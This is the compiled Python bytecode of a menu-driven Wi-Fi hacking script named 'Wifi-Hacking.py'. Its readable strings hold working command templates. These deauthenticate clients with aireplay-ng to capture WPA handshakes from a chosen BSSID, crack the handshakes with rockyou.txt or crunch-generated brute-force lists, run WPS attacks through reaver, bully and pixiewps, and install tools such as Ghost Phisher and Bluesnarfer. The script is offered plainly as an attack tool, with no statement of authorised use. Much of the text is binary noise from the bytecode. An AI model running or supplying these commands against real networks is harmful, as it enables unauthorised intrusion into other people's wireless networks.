ó
çà_c           @   s   d  d l  Z  d  d l Z d  d l Te d d d d d d d	 d
 d d g
  d k rU n( d GHd GHe  j d  Z e  j d  Z d   Z e   d S(   iÿÿÿÿN(   t   *t   whichs   aircrack-ngt   xtermt   cuppt   reavert   pixiewpst   bullyt   wifitet   cruncht	   wordlistsi    s   
Installing Needed Toolss   
sU   apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifites   sleep 3 && clearc             s¸
  t  j d  }  d GHd GHt t d   } | d k rp d GHt d  } d j |  } t  j |  } t   n
| d k rµ d	 GHt d  } d
 j |  } t  j |  } t   n×	| d k rd GHt d  } d j |  } d GHt  j d  }  t  j |  } t  j d  }  t   no	| d k rd GHt d  } d j |  } d GHd GHd GHd GHt  j d  }  t  j |  } d GHt t d   } d GHt t    } d GHt t d   } d GHd GHt t d   } d j | | | | | | |  } t  j |  } t   ny| d k r8  f d         nT| d  k rbt  j d  }  d! GHt   n*| d  k rxt   n| d" k rlt  j	 j
 d#  t k rïd$ GHt t d   } d% j |  } d& GHt  j |  } t  j d'  }	 t   q
t  j	 j
 d#  t k r
t  j d(  }  d$ GHt t d   } d% j |  } d& GHt  j |  } t  j d'  }	 t   q
n | d) k rÑd$ GHt t d   } d* GHt t d   }
 d+ j | |
  } t  j |  } t   n»| d, k r¿d- GHt t d   } d$ GHt t d   } d. GHt t d   } d/ GHt t d   } d0 GHd1 GHt t d   } | d2 k rt d3  } d4 j | | | | |  } t  j |  } n| d5 k rßt d6  } d4 j | | | | |  } t  j |  } nÉ| d7 k r$t d8  } d4 j | | | | |  } t  j |  } n| d9 k rit d:  } d4 j | | | | |  } t  j |  } n?| d; k r®t d<  } d4 j | | | | |  } t  j |  } nú| d= k rót d>  } d4 j | | | | |  } t  j |  } nµ| d? k r8t d@  } d4 j | | | | |  } t  j |  } np| dA k r}t dB  } d4 j | | | | |  } t  j |  } n+| dC k rÂt dD  } d4 j | | | | |  } t  j |  } næ | dE k rt dF  } d4 j | | | | |  } t  j |  } n¡ | dG k rLt dH  } d4 j | | | | |  } t  j |  } n\ | dI k rdJ GHt t d   } d4 j | | | | |  } t  j |  } n dK GHt   dL GHt  j d'  } nÍ| dM k red. GHt t d   } d/ GHt t d   } dN GHt t d   } dO GHt t d   } dP j | | | |  } t  j |  } dQ j |  } | GHn'| dR k r#
t  j d  }  dS GHdT GHt t d   } | d k r	dU GHt t d   } dV GHt t d   } dW j | |  } t  j |  } t   q
| d k r	dX GHt t d   } dV GHt t d   } dY GHt t d   } dZ j | | |  } t  j |  } t   q
| d k r¥	t  j d[  }  t   q
| d k r

dX GHt t d   } dV GHt t d   } d\ j | |  } t  j |  } t   q
| d  k r
t   q
ni | d] k r
dX GHt t d   } d^ j |  } t  j |  } t  j d_  }  t   t  j d`  }  n  | da k r¨
t  j db  n dc GHt   d  S(d   Nt   clears  [1;32m
---------------------------------------------------------------------------------------
 _     _____     _______   __        ___  __ _ 
| |   / _ \ \   / / ____|  \ \      / (_)/ _(_)
| |  | | | \ \ / /|  _| ____\ \ /\ / /| | |_| |
| |__| |_| |\ V / | |__|_____\ V  V / | |  _| |
|_____\___/  \_/  |_____|     \_/\_/  |_|_| |_|
Coded By youssef
---------------------------------------------------------------------------------------                                                                     
(1)Start monitor mode       
(2)Stop monitor mode                        
(3)Scan Networks                            
(4)Getting Handshake(monitor mode needed)   
(5)Install Wireless tools                   
(6)Crack Handshake with rockyou.txt (Handshake needed)
(7)Crack Handshake with wordlist    (Handshake needed)
(8)Crack Handshake without wordlist (Handshake,essid needed)
(9)Create wordlist                                     
(10)WPS Networks attacks (Bssid,monitor mode needed)
(11)Scan for WPS Networks
(12)Generate wordlist with infogathering

(0)About Me
(00)Exit
-----------------------------------------------------------------------
s&   
Enter your choise here wifi@cracker: t    i   s+   
Enter the interface:(Default(wlan0/wlan1))s*   airmon-ng start {} && airmon-ng check killi   s1   
Enter the interface:(Default(wlan0mon/wlan1mon))s4   airmon-ng stop {} && service network-manager restarti   s5   
Enter the interface:(Default >> (wlan0mon/wlan1mon))s   airodump-ng {} -Ms   When Done Press CTRL+cs   sleep 3s   sleep 10i   s4   
Enter the interface:(Default >>(wlan0mon/wlan1mon))s   
When Done Press CTRL+csI   
Note: Under Probe it might be Passwords So copy them to the worlist filesC   
Don't Attack The Network if its Data is ZERO (you waste your time)s$   
you Can use 's' to arrange networkss   sleep 7s   
Enter the bssid of the target?s"   
Enter the channel of the network?s#   Enter the path of the output file ?sD   
Enter the number of the packets [1-10000] ( 0 for unlimited number)sM   the number of the packets Depends on the Distance Between you and the networksK   airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}i   c             s4  t  j d  }  d GHt t d   } | d k rD t  j d  }  nå| d k rX d GHnÑ| d k rl d	 GHn½| d
 k r t  j d  }  n| d k r¨ t  j d  }  n| d k rÆ t  j d  }  nc| d k rä t  j d  }  nE| d k rt  j d  }  n'| d k r t  j d  }  n	| d k r>t  j d  }  në| d k r\t  j d  }  nÍ| d k rzt  j d  }  n¯| d k rt  j d  }  n| d k r¶t  j d  }  ns| d  k rÔt  j d!  }  nU| d" k ròt  j d#  }  n7| d$ k rt  j d%  }  n| d& k r.t  j d'  }  nû| d( k rLt  j d)  }  nÝ| d* k rjt  j d+  }  n¿| d, k rt  j d-  }  n¡| d. k r¦t  j d/  }  n| d0 k rÄt  j d1  }  ne| d2 k rât  j d3  }  nG| d4 k r t  j d5  }  n)| d6 k rt  j d7  }  n| d8 k r<t  j d9  }  ní | d: k rZt  j d;  }  nÏ | d< k rxt  j d=  }  n± | d> k rt  j d?  }  n | d@ k r´t  j dA  }  nu | dB k rÒt  j dC  }  nW | dD k rðt  j dE  }  n9 | dF k rt   n# | dG k r$t  j dH  }  n dI GH    d  S(J   NR
   s  
1) Aircrack-ng                          17) kalibrate-rtl
2) Asleap                               18) KillerBee
3) Bluelog                              19) Kismet
4) BlueMaho                             20) mdk3
5) Bluepot                              21) mfcuk
6) BlueRanger                           22) mfoc
7) Bluesnarfer                          23) mfterm
8) Bully                                24) Multimon-NG
9) coWPAtty                             25) PixieWPS
10) crackle                             26) Reaver
11) eapmd5pass                          27) redfang
12) Fern Wifi Cracker                   28) RTLSDR Scanner
13) Ghost Phisher                       29) Spooftooph
14) GISKismet                           30) Wifi Honey
15) Wifitap                             31) gr-scan
16) Wifite                              32) Back to main menu
90) airgeddon
91) wifite v2

0)install all wireless tools
s#   Enter The number of the tool : >>> i   s2   sudo apt-get update && apt-get install aircrack-ngiZ   sf   sudo apt-get update && apt-get install git && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.giti[   s]   sudo apt-get update && apt-get install git && git clone https://github.com/derv82/wifite2.giti   s-   sudo apt-get update && apt-get install asleepi   s.   sudo apt-get update && apt-get install bluelogi   s/   sudo apt-get update && apt-get install bluemahoi   s.   sudo apt-get update && apt-get install bluepoti   s1   sudo apt-get update && apt-get install bluerangeri   s2   sudo apt-get update && apt-get install bluesnarferi   s,   sudo apt-get update && apt-get install bullyi	   s/   sudo apt-get update && apt-get install cowpattyi
   s.   sudo apt-get update && apt-get install cracklei   s1   sudo apt-get update && apt-get install eapmd5passi   s8   sudo apt-get update && apt-get install fern-wifi-crackeri   s4   sudo apt-get update && apt-get install ghost-phisheri   s0   sudo apt-get update && apt-get install giskismeti   sH   apt-get install git && git clone git://git.kali.org/packages/gr-scan.giti   s4   sudo apt-get update && apt-get install kalibrate-rtli   s3   sudo apt-get update && apt-get install killerbee-ngi   s-   sudo apt-get update && apt-get install kismeti   s+   sudo apt-get update && apt-get install mdk3i   s,   sudo apt-get update && apt-get install mfcuki   s+   sudo apt-get update && apt-get install mfoci   s-   sudo apt-get update && apt-get install mftermi   s2   sudo apt-get update && apt-get install multimon-ngi   s/   sudo apt-get update && apt-get install pixiewpsi   s-   sudo apt-get update && apt-get install reaveri   s.   sudo apt-get update && apt-get install redfangi   s5   sudo apt-get update && apt-get install rtlsdr-scanneri   s1   sudo apt-get update && apt-get install spooftoophi   s1   sudo apt-get update && apt-get install wifi-honeyi   s.   sudo apt-get update && apt-get install wifitapi   s-   sudo apt-get update && apt-get install wifitei    i    s  apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifites	   Not Found(   t   ost   systemt   intt   inputt   intro(   t   cmdt   w(   t   wire(    s   Wifi-Hacking.pyR   X   s    
i    sH   
Hi.
facebook:youssefslimene
github:youhacker55

Feel Free to Contact,

i   s    /usr/share/wordlists/rockyou.txts'   
Enter the path of the handshake file ?s2   aircrack-ng {} -w /usr/share/wordlists/rockyou.txts   
To exit Press CTRL +Cs   sleep 3ds+   gzip -d /usr/share/wordlists/rockyou.txt.gzi   s!   
Enter the path of the wordlist ?s   aircrack-ng {} -w {}i   sa   
Enter the essid of the network ?(Be careful when you type it and use 'the name of the network') s1   
Enter the minimum length of the password (8/64)?s1   
Enter the maximum length of the password (8/64)?s¯  
---------------------------------------------------------------------------------------
(1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
(2)  Uppercase chars                                 (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
(3)  Numeric chars                                   (0123456789)
(4)  Symbol chars                                    (!#$%/=?{}[]-*:;)
(5)  Lowercase + uppercase chars                     (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
(6)  Lowercase + numeric chars                       (abcdefghijklmnopqrstuvwxyz0123456789)
(7)  Uppercase + numeric chars                       (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
(8)  Symbol + numeric chars                          (!#$%/=?{}[]-*:;0123456789)
(9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) 
(10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
(11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
(12) Your Own Words and numbers
-----------------------------------------------------------------------------------------
Crack Password Could Take Hours,Days,Weeks,Months to complete
and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
may reach to Hundreds of TeRa Bits so Be patiant
s   
Enter your choise here : ?t   1t   abcdefghijklmnopqrstuvwxyzs*   crunch {} {} {} | aircrack-ng {} -e {} -w-t   2t   ABCDEFGHIJKLMNOPQRSTUVWXYZt   3t
   0123456789t   4s   !#$%/=?{}[]-*:;t   5t4   abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZt   6t$   abcdefghijklmnopqrstuvwxyz0123456789t   7t$   ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789t   8s   !#$%/=?{}[]-*:;0123456789t   9t>   abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789t   10sC   abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;t   11sM   abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;t   12s   Enter you Own Words and numberss
   
Not Founds$   Copy the Password and Close the tooli	   s#   
Enter the path of the output file?s+   
Enter what you want the password contain ?s   crunch {} {} {} -o {}s'   The wordlist in >>>>> {} Named as SRARTi
   sK   
1)Reaver
2)Bully
3)wifite (Recommeneded)
4)PixieWps

0) Back to Main Menu
s   Choose the kind of the attack ?s;   
Enter the interface to start ?(Default(Wlan0mon/Wlan1mon))s!   
Enter the bssid of the network ?s   reaver -i {} -b {} -vvs:   
Enter the interface to start ?(Default(Wlan0mon/Wlan1mon)s#   
Enter the channel of the network ?s   bully -b {} -c {} --pixiewps {}R   s   reaver -i {} -b {} -Ki   s   airodump-ng -M --wps {}s   sleep 5 s   sleep 2i   s   cupp -is	   not found(   R   R   R   R   t   formatR   t   strt   quitt   exitt   patht   existst   Truet   False(   R   t   vart	   interfacet   ordert   genyt   bssidt   channelR+   t   distt   sleept   wordlistt   essidt   minit   maxt   sett   testt   cmd5t   passwordt   at   attack(    (   R   s   Wifi-Hacking.pyR      s    


!
b








(   R   t
   subprocesst   callR   t   cmd0R   R   (    (    (    s   Wifi-Hacking.pyt   <module>   s   
0	ÿ p